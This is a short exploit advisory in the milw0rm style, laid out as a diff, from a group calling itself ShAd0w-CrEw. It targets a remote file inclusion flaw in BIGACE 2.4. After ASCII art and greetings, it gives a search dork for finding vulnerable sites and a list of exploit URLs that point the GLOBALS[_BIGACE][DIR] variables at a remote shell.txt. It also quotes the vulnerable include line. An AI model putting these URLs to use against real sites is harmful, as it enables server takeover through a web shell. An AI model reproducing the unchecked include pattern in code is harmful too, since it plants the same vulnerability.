@@ -1,0 +1,52 @@
+				  /   \    
+_                         )      ((   ))     (
+(@)                      /|\      ))_((     /|\
+|-|                     / | \    (/\|/\)   / | \                      (@)
+| |--------------------/--|-voV---\`|'/--Vov-|--\---------------------|-|
+|-|                         '^`   (o o)  '^`                          | |
+| |                               `\Y/'                               |-|
+|-|                                                                   | |
+| |                          -=ShAd0w-CrEw=-                          |-|
+|-|                                                                   | |
+| |                                                                   |-|
+|_|___________________________________________________________________| |
+(@)              l   /\ /         ( (       \ /\   l                  |-|
+                 l /   V           \ \       V   \ l                  (@)
+                 l/                _) )_          \I
+                                   `\ /'
+                                     `
+            ----------------------------------------------
+              GrEeTs To -=sHaDoW sEcUrItY TeAm=- GrEeTs To
+            ----------------------------------------------
+               Fabian, CraCkEr, ICQBomber w3tw0rk Str0ke
+            ----------------------------------------------
+                   BiG sHoUt OuT tO sh4d0w-crew.net
+            ----------------------------------------------
+
+Script Download:http://sourceforge.net/project/platformdownload.php?group_id=149865
+Dork: "Powered by BIGACE 2.4"
+
+Vulnerability Type: Remote File Inclusion
+Vulnerable file: /bigace/system/admin/plugins/menu/menuTree/plugin.php
+Exploit URL: http://localhost/bigace/addon/smarty/plugins/function.captcha.php?GLOBALS[_BIGACE][DIR][addon]=http://localhost/shell.txt?
+http://localhost/bigace/addon/smarty/plugins/function.captcha.php?GLOBALS[_BIGACE][DIR][addon]=http://localhost/shell.txt?
+http://localhost/bigace/system/application/util/item_information.php?GLOBALS[_BIGACE][DIR][admin]=http://localhost/shell.txt?
+http://localhost/bigace/system/application/util/jstree.php?GLOBALS[_BIGACE][DIR][admin]=http://localhost/shell.txt?
+http://localhost/bigace/system/classes/sql/AdoDBConnection.php?GLOBALS[_BIGACE][DIR][addon]=http://localhost/shell.txt?
+http://localhost/bigace/system/admin/plugins/menu/menuTree/plugin.php?GLOBALS[_BIGACE][DIR][admin]=http://localhost/shell.txt?
+http://localhost/bigace/system/admin/plugins/menu/menuTree/plugin.php?GLOBALS[_BIGACE][DIR][admin]=http://localhost/shell.txt?
+
+Method: get
+Register_globals: On
+Vulnerable variable: GLOBALS[_BIGACE][DIR][admin]
+Line number: 90
+Lines:
+
+----------------------------------------------
+    include_once( dirname(__FILE__).'/menu_item_listing.php');
+    include_once( $GLOBALS['_BIGACE']['DIR']['admin'] . 'include/item_main.php' );
+}
+
+----------------------------------------------[/code]
+
+# milw0rm.com [2008-05-12]
